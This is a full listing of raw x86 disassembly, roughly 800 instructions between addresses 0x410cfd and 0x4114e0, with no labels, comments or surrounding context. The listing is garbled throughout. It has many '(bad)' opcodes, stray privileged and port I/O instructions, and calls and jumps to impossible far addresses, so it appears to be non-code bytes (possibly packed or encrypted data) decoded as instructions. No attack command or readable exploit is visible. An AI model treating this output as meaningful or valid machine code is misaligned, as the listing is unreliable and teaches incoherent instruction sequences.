  410cfd:	xchg   BYTE PTR [ebx],al
  410cff:	add    esp,edi
  410d01:	add    BYTE PTR [ebp-0x39],cl
  410d04:	mov    al,bl
  410d06:	test   DWORD PTR [ebx+0x1c348375],ecx
  410d0c:	sub    al,0xbf
  410d0e:	jmp    0x410c95
  410d10:	mov    edi,eax
  410d12:	lock jge 0x410d06
  410d15:	lea    esi,[edx-0x74bad503]
  410d1b:	mov    ebp,esp
  410d1d:	or     cl,dh
  410d1f:	leave  
  410d20:	add    al,BYTE PTR [eax+eax*4-0x37ff9d00]
  410d27:	dec    ebp
  410d28:	dec    ebp
  410d29:	test   DWORD PTR [ebx],eax
  410d2b:	paddb  mm6,mm0
  410d2e:	add    DWORD PTR [eax],eax
  410d30:	dec    ebp
  410d31:	mov    ecx,DWORD PTR [ebx-0x62b217f0]
  410d37:	mov    esi,DWORD PTR [edx]
  410d39:	or     al,0x2b
  410d3b:	dec    ebp
  410d3c:	xor    ecx,DWORD PTR [ebx+0x4575083b]
  410d42:	mov    esp,ebp
  410d44:	adc    BYTE PTR [ebp+edx*2+0x33ec3389],bl
  410d4b:	mov    DWORD PTR [ebx],ebp
  410d4d:	call   0xc74967d
  410d52:	mov    DWORD PTR [ebp+0x10],ecx
  410d55:	(bad)  
  410d56:	push   0x8b85ff10
  410d5b:	clc    
  410d5c:	or     al,0x56
  410d5e:	(bad)  
  410d5f:	push   ecx
  410d60:	retf   
  410d61:	mov    ebx,0xff4d8dc8
  410d66:	mov    DWORD PTR [ebp+0x8],eax
  410d69:	xor    eax,DWORD PTR [ebp-0x75]
  410d6c:	cmp    ebp,DWORD PTR [ebx]
  410d6e:	lsl    ebx,WORD PTR [edi-0x8]
  410d72:	call   DWORD PTR [ebx-0x741bff75]
  410d78:	(bad)  
  410d79:	or     al,0x5b
  410d7b:	dec    ebp
  410d7c:	or     BYTE PTR [ebx],dh
  410d7e:	inc    ebp
  410d7f:	xor    esi,DWORD PTR ds:0x708088d
  410d85:	in     eax,0x9d
  410d87:	add    BYTE PTR [edx],dh
  410d89:	inc    ebp
  410d8a:	pop    edi
  410d8b:	xor    eax,edx
  410d8d:	test   DWORD PTR [eax],0x83108b8b
  410d93:	dec    ebp
  410d94:	adc    al,0x33
  410d96:	inc    ebp
  410d97:	xor    esi,DWORD PTR ds:0xc73b9c2b
  410d9d:	jne    0x410d9b
  410d9f:	mov    eax,DWORD PTR [ebp+0x345f808]
  410da5:	mov    eax,DWORD PTR [ebp-0xc]
  410da8:	mov    DWORD PTR [eax],0x685c9f4
  410dae:	clc    
  410daf:	dec    eax
  410db0:	push   edi
  410db1:	ss inc ebp
  410db3:	pop    ss
  410db4:	aad    0x4d
  410db6:	xlat   BYTE PTR ds:[ebx]
  410db7:	or     BYTE PTR [ebx+0x4d63fc56],0xd1
  410dbe:	mov    eax,0x780084d
  410dc3:	push   esi
  410dc4:	clc    
  410dc5:	ret    0xe99d
  410dc8:	xor    dl,dl
  410dca:	xor    ecx,DWORD PTR [ebx+0x4d030803]
  410dd0:	js     0x88799cf
  410dd6:	dec    ebp
  410dd7:	push   ebp
  410dd8:	mov    edi,DWORD PTR [eax+0xc872fc]
  410dde:	lock enter 0xceca,0xf2
  410de3:	retf   0x18ce
  410de6:	jne    0x410e35
  410de8:	mov    ecx,DWORD PTR [ebx-0x31eaf304]
  410dee:	enter  0xf0d6,0xca
  410df2:	retf   0xf2c8
  410df5:	into   
  410df6:	out    dx,al
  410df7:	dec    ebp
  410df8:	dec    ebp
  410df9:	jmp    0xff450d31
  410dfe:	xor    eax,DWORD PTR [ebp-0x15]
  410e01:	xor    esi,DWORD PTR [ebx]
  410e03:	mov    esi,DWORD PTR [ebx]
  410e05:	sub    eax,DWORD PTR [ebx]
  410e07:	add    eax,DWORD PTR [ebx]
  410e09:	or     bl,dl
  410e0b:	dec    ebp
  410e0c:	mov    DWORD PTR [ebx-0x38b2ef08],ecx
  410e12:	xor    eax,DWORD PTR [ebp-0xf00073]
  410e18:	jb     0x410e5f
  410e1a:	add    BYTE PTR [ebx],dh
  410e1c:	dec    ebp
  410e1d:	pop    esi
  410e1e:	mov    ebp,ebx
  410e20:	cld    
  410e21:	mov    esi,eax
  410e23:	call   0x520f64f0
  410e28:	stc    
  410e29:	add    eax,0x4572aa
  410e2e:	pop    edi
  410e2f:	leave  
  410e30:	add    ecx,DWORD PTR [eax*2-0x3c13a1ab]
  410e37:	in     al,dx
  410e38:	mov    eax,edi
  410e3a:	xor    eax,0xf8008520
  410e40:	mov    DWORD PTR [ebp-0x14],0xf89c8532
  410e47:	mov    eax,DWORD PTR [ebp-0x77]
  410e4a:	xor    bh,al
  410e4c:	pushf  
  410e4d:	inc    ebp
  410e4e:	(bad)  
  410e4f:	cmp    eax,0x56869ce8
  410e54:	clc    
  410e55:	mov    edi,0x8518e4ec
  410e5b:	jmp    0xf056:0x8b457df8
  410e62:	push   esi
  410e63:	push   esi
  410e64:	push   ecx
  410e65:	push   ecx
  410e66:	push   edi
  410e67:	xor    eax,esi
  410e69:	mov    edx,0x32729d
  410e6e:	add    ecx,eax
  410e70:	mov    edx,edi
  410e72:	clc    
  410e73:	retf   0xaf45
  410e76:	cmp    eax,0xc78b9ceb
  410e7b:	clc    
  410e7c:	cld    
  410e7d:	jne    0x410e97
  410e7f:	xor    ebp,edx
  410e81:	xor    eax,DWORD PTR [ebp+0x3]
  410e84:	or     BYTE PTR [ebx],al
  410e86:	add    BYTE PTR [ebp-0x7747475],al
  410e8c:	hlt    
  410e8d:	dec    ebp
  410e8e:	dec    ebp
  410e8f:	je     0x410ec4
  410e91:	xor    esi,DWORD PTR [ebx]
  410e93:	xor    eax,DWORD PTR [ebx]
  410e95:	add    eax,DWORD PTR [ebx]
  410e97:	add    ecx,DWORD PTR [edi]
  410e99:	rol    ecx,cl
  410e9b:	mov    esi,DWORD PTR [ecx]
  410e9d:	in     al,dx
  410e9e:	inc    ebp
  410e9f:	enter  0xca2b,0x33
  410ea3:	icebp  
  410ea4:	mov    DWORD PTR [edx],ecx
  410ea6:	clc    
  410ea7:	lock pop ebp
  410ea9:	enter  0xf2e8,0xfe
  410ead:	retf   0xeeff
  410eb0:	inc    ebp
  410eb1:	jne    0x410e3e
  410eb3:	mov    edi,eax
  410eb5:	cld    
  410eb6:	dec    ebp
  410eb7:	enter  0xbc89,0x8d
  410ebb:	popf   
  410ebc:	sti    
  410ebd:	xor    bh,bh
  410ebf:	mov    eax,DWORD PTR [ebp-0xc]
  410ec2:	mov    esi,DWORD PTR [ebp-0x4]
  410ec5:	xor    eax,esi
  410ec7:	xor    eax,DWORD PTR [ebx+ebp*1+0x76323b9d]
  410ece:	mov    DWORD PTR [ebx-0x76ba0704],ecx
  410ed4:	mov    ecx,DWORD PTR [ebx-0x3631070c]
  410eda:	(bad)  
  410edb:	push   ebp
  410edc:	shr    esp,0x4d
  410edf:	in     al,dx
  410ee0:	cmp    eax,DWORD PTR [esi+esi*2]
  410ee3:	add    BYTE PTR [ebx-0x39ca1bbb],cl
  410ee9:	pushf  
  410eea:	mov    edi,0x85c7f445
  410ef0:	call   0xf88695ed
  410ef5:	xor    eax,0x53619cdb
  410efa:	dec    ebp
  410efb:	inc    ebp
  410efc:	mov    esi,DWORD PTR [eax+edi*8]
  410eff:	pushf  
  410f00:	into   
  410f01:	mov    ecx,edi
  410f03:	in     al,dx
  410f04:	call   0x8b4954c7
  410f09:	pop    es
  410f0a:	or     BYTE PTR [ebx],dh
  410f0c:	or     BYTE PTR [edi+0x8a724d],bh
  410f12:	or     eax,edi
  410f14:	push   ebp
  410f15:	inc    ebp
  410f16:	cmpxchg8b (bad)
  410f17:	(bad)  
  410f18:	leave  
  410f19:	loopne 0x410ee5
  410f1b:	test   DWORD PTR [ebp-0x8],ecx
  410f1e:	mov    eax,DWORD PTR [ebp-0x18]
  410f21:	aad    0x55
  410f23:	xlat   BYTE PTR ds:[ebx]
  410f24:	xor    eax,edi
  410f26:	add    esi,eax
  410f28:	and    eax,DWORD PTR [eax]
  410f2a:	mov    eax,DWORD PTR [eax]
  410f2c:	(bad)  
  410f2d:	leave  
  410f2e:	sti    
  410f2f:	inc    ebp
  410f30:	dec    DWORD PTR [ebx-0x39cc13ab]
  410f36:	mov    esi,ecx
  410f38:	clc    
  410f39:	(bad)  
  410f3a:	dec    ebp
  410f3b:	iret   
  410f3c:	xor    ebp,DWORD PTR [edi-0x74f71473]
  410f42:	jb     0x410f40
  410f44:	add    bh,al
  410f46:	inc    ebp
  410f47:	(bad)  
  410f48:	mov    eax,DWORD PTR [ebp-0xc]
  410f4b:	(bad)  
  410f4c:	xabort 0x63
  410f4f:	loopne 0x410f1e
  410f51:	jmp    FWORD PTR [ebx]
  410f53:	mov    DWORD PTR [ebx],eax
  410f55:	clc    
  410f56:	lock inc ebp
  410f58:	dec    ebp
  410f59:	mov    ecx,DWORD PTR [ebx+0x4d84ecfc]
  410f5f:	loopne 0x410f94
  410f61:	inc    DWORD PTR [ebx]
  410f63:	mov    edi,DWORD PTR [ebx]
  410f65:	hlt    
  410f66:	jne    0x410fb5
  410f68:	mov    esi,DWORD PTR [ebx]
  410f6a:	in     al,0x8d
  410f6c:	dec    ebp
  410f6d:	or     BYTE PTR [ebx],dh
  410f6f:	jb     0x410f74
  410f71:	add    BYTE PTR [edi+0x45],bl
  410f74:	xor    ecx,DWORD PTR [ebx+0x4dc2e85b]
  410f7a:	add    BYTE PTR [ebx],dh
  410f7c:	mov    esi,DWORD PTR [ebx]
  410f7e:	mov    ebp,DWORD PTR [ebx]
  410f80:	sbb    BYTE PTR [ebx-0x377403b3],cl
  410f86:	nop
  410f87:	mov    ecx,0x338b4500
  410f8c:	add    DWORD PTR [ebx],0x70
  410f8f:	mov    DWORD PTR [esi-0x8],edx
  410f92:	jne    0x410fd9
  410f94:	mov    esi,DWORD PTR [edi+edx*2]
  410f97:	pushf  
  410f98:	push   esi
  410f99:	mov    edx,DWORD PTR [ecx-0x15]
  410f9c:	xor    ecx,DWORD PTR [ebx+0x4572e0bb]
  410fa2:	add    BYTE PTR [ebx],dh
  410fa4:	retf   
  410fa5:	add    edx,ecx
  410fa7:	ror    DWORD PTR [edi],cl
  410fa9:	mov    DWORD PTR ds:0x7f452dfc,ebp
  410faf:	mov    ch,dl
  410fb1:	mov    BYTE PTR [eax+0xb],dh
  410fb4:	fimul  WORD PTR [ebp+0x0]
  410fb7:	mov    ecx,DWORD PTR [ebx+0x55b608f8]
  410fbd:	xor    esi,DWORD PTR [ebx]
  410fbf:	mov    DWORD PTR [ebx],esi
  410fc1:	or     BYTE PTR [ebx],al
  410fc3:	dec    ebp
  410fc4:	add    ecx,DWORD PTR [ebx-0x318af7c5]
  410fca:	or     edi,0x8c64ca9c
  410fd0:	out    dx,eax
  410fd1:	loopne 0x410fe8
  410fd3:	(bad)  
  410fd4:	jmp    0x13d1464
  410fd9:	retf   0x4d4d
  410fdc:	xor    ecx,DWORD PTR [ebx-0x31c40bfd]
  410fe2:	je     0x3241ad8c
  410fe8:	mov    ecx,DWORD PTR [ecx+0x45450818]
  410fee:	mov    DWORD PTR [ebx],esi
  410ff0:	sbb    BYTE PTR [ecx-0x7472b3],bh
  410ff6:	mov    eax,ecx
  410ff8:	fmul   DWORD PTR [ebp+0x45]
  410ffb:	mov    DWORD PTR ds:0xba459cf0,esi
  411001:	mov    eax,DWORD PTR [ebp+0x55c6f8f0]
  411007:	(bad)  
  411008:	mov    ecx,eax
  41100a:	sbb    BYTE PTR [ecx-0x7474babb],dl
  411010:	sbb    al,bh
  411012:	add    dh,0x1
  411015:	mov    DWORD PTR [eax],0x4dc1005e
  41101b:	leave  
  41101c:	mov    eax,DWORD PTR [eax+ebx*1]
  41101f:	push   ebp
  411020:	mov    esp,ebp
  411022:	add    DWORD PTR [ebp+0x0],eax
  411025:	mov    ecx,DWORD PTR [ecx]
  411027:	or     BYTE PTR [eax-0x80],cl
  41102a:	mov    DWORD PTR [ecx],eax
  41102c:	or     al,0x0
  41102e:	inc    ebp
  41102f:	add    BYTE PTR [ebx],dh
  411031:	in     al,dx
  411032:	add    edx,DWORD PTR [ebx-0x77]
  411035:	mov    esi,esp
  411037:	adc    BYTE PTR [ebp+0x16],al
  41103a:	xor    edi,DWORD PTR [edi+0x7890803]
  411040:	adc    al,0xcf
  411042:	inc    ebp
  411043:	popf   
  411044:	mov    esi,DWORD PTR [edx]
  411046:	push   eax
  411047:	add    ebp,eax
  411049:	cmp    ecx,DWORD PTR [ecx+0x4581d075]
  41104f:	pushf  
  411050:	mov    esp,DWORD PTR [eax+edi*1+0x44]
  411054:	dec    ebp
  411055:	fwait
  411056:	dec    eax
  411057:	jmp    0xcc149d
  41105c:	or     al,0x4d
  41105e:	sbb    BYTE PTR [ebx-0x3074f3c0],cl
  411064:	or     al,0xd7
  411066:	dec    ecx
  411067:	retf   
  411068:	dec    eax
  411069:	rcl    eax,cl
  41106b:	retf   0xfc8
  41106e:	inc    ebp
  41106f:	or     eax,0x7f382d8b
  411074:	sar    esp,0x3
  411077:	lahf   
  411078:	inc    eax
  411079:	mov    ebp,0x8b180089
  41107e:	inc    ebp
  41107f:	or     BYTE PTR [ebx],dh
  411081:	iret   
  411082:	add    ecx,ebx
  411084:	mov    ecx,eax
  411086:	adc    al,0x84
  411088:	inc    ebp
  411089:	add    al,0x33
  41108b:	add    BYTE PTR [ebx],al
  41108d:	dec    ebp
  41108e:	mov    DWORD PTR [ecx+0x4d45dc14],ecx
  411094:	mov    ecx,DWORD PTR [ebx+0x6c714d4]
  41109a:	ret    
  41109b:	inc    ebp
  41109c:	add    edi,eax
  41109e:	push   ebp
  41109f:	or     bh,al
  4110a1:	test   DWORD PTR [eax+edi*8],edx
  4110a4:	test   DWORD PTR [edx],esi
  4110a6:	clc    
  4110a7:	pushf  
  4110a8:	inc    ebp
  4110a9:	mov    DWORD PTR [eax],esi
  4110ab:	lock pushf 
  4110ad:	inc    ebp
  4110ae:	(bad)  
  4110af:	mov    DWORD PTR [eax+ebx*1],edx
  4110b2:	test   DWORD PTR [ebp-0x8],eax
  4110b5:	mov    eax,DWORD PTR [ebp-0x70]
  4110b8:	mov    eax,DWORD PTR [eax]
  4110ba:	sbb    BYTE PTR [ebx-0x2b3c7639],cl
  4110c0:	scas   eax,DWORD PTR es:[edi]
  4110c1:	dec    ebp
  4110c2:	mov    ecx,DWORD PTR [ebx+0x559008]
  4110c8:	xor    ecx,DWORD PTR [ebx+0x3c11038d]
  4110ce:	jb     0x41111d
  4110d0:	add    BYTE PTR [ebx-0x387cf73f],cl
  4110d6:	add    eax,ebx
  4110d8:	add    BYTE PTR [ebp+0x45],al
  4110db:	mov    esi,DWORD PTR [ebx]
  4110dd:	or     BYTE PTR [ebx],al
  4110df:	(bad)  
  4110e0:	mov    ebx,eax
  4110e2:	adc    al,0x45
  4110e4:	inc    ebp
  4110e5:	mov    eax,DWORD PTR [ebx]
  4110e7:	or     al,0xdc
  4110e9:	inc    eax
  4110ea:	inc    ebp
  4110eb:	cmp    edi,0xc
  4110ee:	hlt    
  4110ef:	inc    ebp
  4110f0:	jne    0x41107d
  4110f2:	mov    ecx,DWORD PTR [esp+ecx*1]
  4110f5:	inc    eax
  4110f6:	bound  ecx,QWORD PTR [ebx-0x7a76f301]
  4110fc:	clc    
  4110fd:	push   esp
  4110fe:	inc    ebp
  4110ff:	inc    ebp
  411100:	cmp    eax,0x8b8b9c74
  411105:	cmp    al,ah
  411107:	dec    ebp
  411108:	(bad)  
  411109:	mov    eax,ebx
  41110b:	push   esp
  41110c:	(bad)  
  41110d:	idiv   DWORD PTR [eax-0x87417dd]
  411113:	or     al,0xff
  411115:	inc    eax
  411116:	inc    ebp
  411117:	add    eax,DWORD PTR [ebp-0x74748b15]
  41111d:	push   esp
  41111e:	loopne 0x411165
  411120:	(bad)  
  411121:	mov    eax,ebx
  411123:	or     bh,bh
  411125:	xbegin 0x508656ee
  41112b:	mov    ebx,esp
  41112d:	or     bh,bh
  41112f:	(bad)  
  411130:	mov    eax,ebx
  411132:	hlt    
  411133:	inc    ebp
  411134:	inc    ebp
  411135:	mov    ecx,DWORD PTR [ebx+0x4d4de008]
  41113b:	xor    ebp,DWORD PTR [ebx]
  41113d:	add    ecx,DWORD PTR [ecx+0x4589e089]
  411143:	adc    al,0x8b
  411145:	inc    ebp
  411146:	clc    
  411147:	xor    eax,DWORD PTR [eax-0x64]
  41114a:	add    eax,edi
  41114c:	or     al,0x14
  41114e:	dec    ebp
  41114f:	test   DWORD PTR [ebx],edi
  411151:	clc    
  411152:	jb     0x411199
  411154:	mov    esi,DWORD PTR [ecx]
  411156:	clc    
  411157:	pushf  
  411158:	inc    eax
  411159:	mov    ecx,DWORD PTR [ebx+0x414df8f0]
  41115f:	xor    ecx,DWORD PTR [ebx-0x3ef01ffd]
  411165:	shr    esi,0x4d
  411168:	add    BYTE PTR [ebx-0x30002f96],cl
  41116e:	hlt    
  41116f:	mov    WORD PTR [ebp-0x63],es
  411172:	push   eax
  411173:	xor    dl,BYTE PTR [ebx+edi*1-0x5347f001]
  41117a:	test   DWORD PTR [eax],eax
  41117c:	clc    
  41117d:	mov    eax,DWORD PTR [ebp+0x8]
  411180:	mov    edi,0x4585c3c8
  411186:	clc    
  411187:	mov    eax,DWORD PTR [ebp+0x18]
  41118a:	xor    eax,DWORD PTR [ebp-0x64]
  41118d:	mov    edi,eax
  41118f:	hlt    
  411190:	shl    BYTE PTR [ebp-0x7b],0x8b
  411194:	clc    
  411195:	fmul   QWORD PTR [ebp+0x4d]
  411198:	mov    eax,ebp
  41119a:	in     al,dx
  41119b:	icebp  
  41119c:	dec    ebp
  41119d:	dec    DWORD PTR [ecx+0x4dc7e845]
  4111a3:	loopne 0x41112e
  4111a5:	test   eax,edi
  4111a7:	clc    
  4111a8:	dec    ebp
  4111a9:	inc    ebp
  4111aa:	mov    DWORD PTR [ebx],esi
  4111ac:	in     al,0x3
  4111ae:	dec    ebp
  4111af:	push   eax
  4111b0:	xor    eax,DWORD PTR [ebp+0x3]
  4111b3:	push   eax
  4111b4:	mov    DWORD PTR [eax-0x20],edx
  4111b7:	push   edi
  4111b9:	mov    eax,DWORD PTR [eax]
  4111bb:	clc    
  4111bc:	cmp    eax,0xf84e85c0
  4111c1:	inc    ebp
  4111c2:	test   BYTE PTR [ebx],dh
  4111c4:	add    DWORD PTR [ebx],eax
  4111c6:	add    BYTE PTR [eax+0x4d],dl
  4111c9:	jne    0x4111fe
  4111cb:	lea    ecx,[ebx-0x7617fc48]
  4111d1:	cmc    
  4111d2:	adc    al,0xff
  4111d4:	inc    ebp
  4111d5:	inc    ebp
  4111d6:	xor    ecx,DWORD PTR [ecx+0x4530e08d]
  4111dc:	jb     0x411169
  4111de:	add    ah,bl
  4111e0:	inc    ebp
  4111e1:	ror    DWORD PTR [ebx+0x4d8bf045],0xf8
  4111e8:	xor    ecx,DWORD PTR [ebp+0x3]
  4111eb:	mov    edi,DWORD PTR [ebx]
  4111ed:	adc    BYTE PTR [ebp+0x41],dh
  4111f0:	mov    ecx,DWORD PTR [ebx-0x37381ff8]
  4111f6:	ret    
  4111f7:	push   ss
  4111f8:	push   0x45
  4111fa:	lea    ecx,[ebx+0x4de80cac]
  411200:	cli    
  411201:	add    edi,edi
  411203:	or     BYTE PTR [ebp+0x4d],al
  411206:	mov    ebp,DWORD PTR [ebx]
  411208:	xor    ebp,ecx
  41120a:	mov    al,BYTE PTR [edx]
  41120c:	add    eax,0xc7200
  411211:	jne    0x411260
  411213:	lea    esi,[ebx]
  411215:	lods   al,BYTE PTR ds:[esi]
  411216:	psubsb mm0,mm0
  411219:	cmc    
  41121a:	retf   
  41121b:	inc    ecx
  41121d:	xor    eax,0x89019c84
  411222:	add    ah,cl
  411224:	inc    ebp
  411225:	inc    ebp
  411226:	mov    esi,DWORD PTR [edx]
  411228:	xor    ebx,DWORD PTR [edx+ecx*4+0x72c405c7]
  41122f:	test   DWORD PTR [eax],eax
  411231:	clc    
  411232:	dec    ebp
  411233:	inc    ebp
  411234:	xor    esi,DWORD PTR [eax]
  411236:	setl   al
  411239:	(bad)  
  41123a:	retf   
  41123b:	int3   
  41123c:	ror    DWORD PTR [ebp-0x7c],0x8d
  411240:	add    eax,ecx
  411242:	add    BYTE PTR [ebp+0x45],cl
  411245:	lea    ecx,[ebx-0x75b2cc3c]
  41124b:	lea    eax,ds:0x4d72c0
  411251:	mov    ecx,DWORD PTR [ebp+0x8]
  411254:	xor    ecx,edi
  411256:	bswap  ebx
  411258:	ror    BYTE PTR [ebp-0x35],0xe9
  41125c:	rol    DWORD PTR [ecx],0x84
  41125f:	add    BYTE PTR [ecx],al
  411261:	xor    eax,DWORD PTR [eax]
  411263:	pushf  
  411264:	inc    ebp
  411265:	jnp    0x8a414669
  41126b:	mov    eax,DWORD PTR ds:0xcf72f0
  411271:	lock dec ebp
  411273:	retf   
  411274:	xor    ecx,DWORD PTR [ebp+0xf]
  411277:	mov    eax,eax
  411279:	loopne 0x411246
  41127b:	test   ecx,0x19d8484
  411281:	xor    al,BYTE PTR [eax]
  411283:	mov    DWORD PTR [ebp-0x20],eax
  411286:	mov    eax,DWORD PTR [ebp+0x33]
  411289:	mov    ecx,DWORD PTR [edx+0x72c705e0]
  41128f:	ret    
  411290:	add    al,cl
  411292:	dec    ebp
  411293:	adc    ecx,DWORD PTR [ebx-0x75ccccbb]
  411299:	add    ecx,DWORD PTR ds:0xc7250
  41129f:	inc    ebp
  4112a0:	rcl    DWORD PTR [eax+0x4d],0x5f
  4112a4:	mov    edi,edi
  4112a6:	xor    ecx,DWORD PTR [ebx+0xdec8a]
  4112ac:	jb     0x411275
  4112ae:	add    BYTE PTR [ecx+eax*8-0x74cdb2b7],al
  4112b5:	mov    esi,DWORD PTR [ebx]
  4112b7:	or     BYTE PTR [edx+0x72b60dcf],cl
  4112bd:	add    eax,DWORD PTR [eax]
  4112bf:	cmp    ecx,eax
  4112c1:	jne    0x41133f
  4112c7:	mov    eax,DWORD PTR [ebp-0x18]
  4112ca:	mov    eax,DWORD PTR [eax]
  4112cc:	xor    eax,edi
  4112ce:	mov    al,BYTE PTR [ebp+eax*1+0x327249]
  4112d5:	mov    ecx,DWORD PTR [ebp+0x8]
  4112d8:	mov    ecx,edi
  4112da:	xor    esi,DWORD PTR [esi+0x3b0d038a]
  4112e0:	jb     0x4112f1
  4112e2:	add    BYTE PTR [eax-0x3f],bl
  4112e5:	add    BYTE PTR [ebp-0x75],cl
  4112e8:	mov    edi,eax
  4112ea:	xor    eax,DWORD PTR [eax]
  4112ec:	mov    al,bh
  4112ee:	or     eax,0x497284
  4112f3:	xor    al,cl
  4112f5:	mov    ecx,DWORD PTR [ebp+0x8]
  4112f8:	mov    ecx,edi
  4112fa:	xor    esi,DWORD PTR [esi+0x3b0d038a]
  411300:	jb     0x411311
  411302:	add    BYTE PTR [eax],bh
  411304:	enter  0x8500,0x8b
  411308:	add    ah,ah
  41130a:	add    BYTE PTR [eax],al
  41130c:	inc    ebp
  41130d:	(bad)  
  41130e:	mov    eax,DWORD PTR [ebx+esi*1+0x5328a49]
  411315:	mov    esi,DWORD PTR [edx+0x8]
  411318:	add    bh,cl
  41131a:	dec    ebp
  41131b:	mov    dh,0x8b
  41131d:	add    esi,DWORD PTR [ebx]
  41131f:	cmp    ecx,DWORD PTR [edx+0x72180d0f]
  411325:	add    BYTE PTR [eax],al
  411327:	mov    eax,ecx
  411329:	call   0xc7cc137b
  41132e:	xor    eax,DWORD PTR [edx+ecx*4+0x72320d49]
  411335:	mov    eax,DWORD PTR [eax]
  411337:	in     al,dx
  411338:	ror    DWORD PTR [ecx],0x4d
  41133b:	iret   
  41133c:	mov    ecx,DWORD PTR [ebx+esi*1+0xd328a49]
  411343:	xor    dh,BYTE PTR [edx-0x75]
  411346:	add    al,bh
  411348:	enter  0x5009,0xcf
  41134c:	inc    ebp
  41134d:	mov    WORD PTR [ebx-0x75cdccb7],cs
  411353:	or     al,BYTE PTR ds:0xec728b
  411359:	or     DWORD PTR [ebp-0x31],ecx
  41135c:	mov    ecx,DWORD PTR [ebx+esi*1+0xd328a4d]
  411363:	cmp    dh,BYTE PTR [edx+0xf]
  411366:	add    ah,dl
  411368:	rol    DWORD PTR [eax],0x4d
  41136b:	mov    ecx,DWORD PTR [ebx-0x75ffcc08]
  411371:	(bad)  
  411372:	or     eax,0x497284
  411377:	xor    al,cl
  411379:	mov    ecx,DWORD PTR [ebp-0x18]
  41137c:	mov    ecx,DWORD PTR [ecx]
  41137e:	xor    ecx,edi
  411380:	mov    cl,BYTE PTR [ebp+ecx*1+0x327249]
  411387:	xor    cl,al
  411389:	mov    edx,DWORD PTR [eax]
  41138b:	in     al,0x45
  41138d:	or     DWORD PTR [eax-0x31],edx
  411390:	mov    ds:0x8b49ff8c,eax
  411395:	xor    dh,BYTE PTR [edx+ecx*1-0x17f5743f]
  41139c:	inc    ebp
  41139d:	or     DWORD PTR [ebx],esi
  41139f:	iret   
  4113a0:	add    ecx,DWORD PTR [ecx+ecx*4+0x4532144d]
  4113a7:	cmp    dh,BYTE PTR [ebx]
  4113a9:	jge    0x7241443f
  4113af:	mov    eax,DWORD PTR [eax]
  4113b1:	in     al,0xc7
  4113b3:	add    BYTE PTR [ebp-0x39],cl
  4113b6:	mov    eax,DWORD PTR [esp+edx*1-0x34cd30b7]
  4113bd:	mov    edx,ecx
  4113bf:	clc    
  4113c0:	test   BYTE PTR [ecx],cl
  4113c2:	std    
  4113c3:	iret   
  4113c4:	dec    DWORD PTR [ebp+eax*2+0x14328b49]
  4113cb:	xor    al,bh
  4113cd:	mov    eax,ebx
  4113cf:	in     al,dx
  4113d0:	enter  0x1109,0xcf
  4113d4:	inc    ebp
  4113d5:	mov    WORD PTR [ebx-0x38cde7b7],cs
  4113db:	or     al,BYTE PTR [ebx+ecx*4+0x932f89d]
  4113e2:	jmp    0x4113b3
  4113e4:	push   0xffffff8c
  4113e6:	dec    DWORD PTR [ebp-0xc]
  4113e9:	xor    al,BYTE PTR [ebp+0x3a]
  4113ec:	push   eax
  4113ed:	jne    0x411409
  4113ef:	mov    edi,edi
  4113f1:	in     al,0x8b
  4113f3:	add    BYTE PTR [eax],cl
  4113f5:	(bad)  
  4113f6:	dec    ebp
  4113f7:	test   BYTE PTR [ebx],dh
  4113f9:	dec    ecx
  4113fa:	add    esi,DWORD PTR [edx]
  4113fc:	cmp    ecx,DWORD PTR [ebx+0x98bec74]
  411402:	or     bh,cl
  411404:	(bad)  
  411405:	mov    ebx,es
  411407:	dec    ecx
  411408:	push   0x32
  41140a:	lea    esi,[edx]
  41140c:	xchg   esp,eax
  41140d:	mov    ebp,eax
  41140f:	call   0xd0401e0c
  411414:	inc    ebp
  411415:	mov    WORD PTR [ebx+0x45321849],es
  41141b:	or     bh,bh
  41141d:	mov    ebp,DWORD PTR [eax-0x74f68a1c]
  411423:	iret   
  411424:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411425:	mov    WORD PTR [ebp+0x4d],es
  411428:	push   eax
  411429:	xor    bl,dh
  41142b:	cmp    bh,bh
  41142d:	jne    0x4113ba
  41142f:	lea    ecx,[eax]
  411431:	lods   al,BYTE PTR ds:[esi]
  411432:	dec    ebp
  411433:	call   0xff450e6b
  411438:	cmp    ecx,DWORD PTR [ebp+0x74]
  41143b:	cmp    ebp,DWORD PTR [edx+0x74]
  41143e:	dec    DWORD PTR [ebx-0x38baf758]
  411444:	add    eax,ebx
  411446:	fadd   DWORD PTR [ebp-0x18]
  411449:	mov    edi,eax
  41144b:	lock inc edi
  41144e:	inc    ebp
  41144f:	test   BYTE PTR [ebx+0x832a89d],cl
  411455:	xor    eax,DWORD PTR [ebp-0x75]
  411458:	add    ecx,DWORD PTR [eax]
  41145a:	sbb    BYTE PTR [ebp+0x45],dl
  41145d:	xor    ecx,DWORD PTR [ebx+0x4d3bf003]
  411463:	rdpmc  
  411465:	test   DWORD PTR [ebx],0xc18b0fff
  41146b:	or     BYTE PTR [ebp+0x4d],cl
  41146e:	mov    esi,DWORD PTR [ebx]
  411470:	rol    BYTE PTR [ebx],1
  411472:	iret   
  411473:	cmp    ecx,DWORD PTR [ebp+esi*2-0xfcd7463]
  41147a:	cmp    ecx,DWORD PTR [ebp+0xf]
  41147d:	xor    edx,DWORD PTR [edi-0x73]
  411480:	dec    DWORD PTR [eax]
  411482:	mov    esi,DWORD PTR [edx+0x10]
  411485:	add    BYTE PTR [ebp+0x77],al
  411488:	mov    DWORD PTR [eax],ebx
  41148a:	jmp    0x411501
  41148c:	or     DWORD PTR [ebp-0x179b6b64],0xff65f3bf
  411496:	pop    edi
  411497:	inc    ebp
  411498:	pop    ebx
  411499:	mov    eax,edx
  41149b:	loopne 0x41149d
  41149d:	(bad)  
  41149e:	mov    eax,ebx
  4114a0:	push   ecx
  4114a1:	ror    DWORD PTR [ebx+0x4d450813],0x33
  4114a8:	push   esi
  4114a9:	add    edi,DWORD PTR [edi+0x7180850]
  4114af:	inc    ebp
  4114b0:	(bad)  
  4114b1:	push   eax
  4114b2:	popf   
  4114b3:	dec    edi
  4114b4:	xor    bh,bh
  4114b6:	add    ecx,DWORD PTR [ebx-0x3f740b77]
  4114bc:	adc    al,0x89
  4114be:	adc    BYTE PTR [ecx+eax*1],0x75
  4114c2:	add    bh,bh
  4114c4:	or     BYTE PTR [eax*2-0x6bfc74bb],dl
  4114cb:	fadd   DWORD PTR [eax]
  4114cd:	call   0xff45075d
  4114d2:	cmp    al,0x45
  4114d4:	dec    ebp
  4114d5:	mov    ecx,DWORD PTR [ebx+0xc7d8e0]
  4114db:	ret    
  4114dc:	mov    eax,ecx
  4114de:	adc    al,0x11
  4114e0:	add    al,0x0
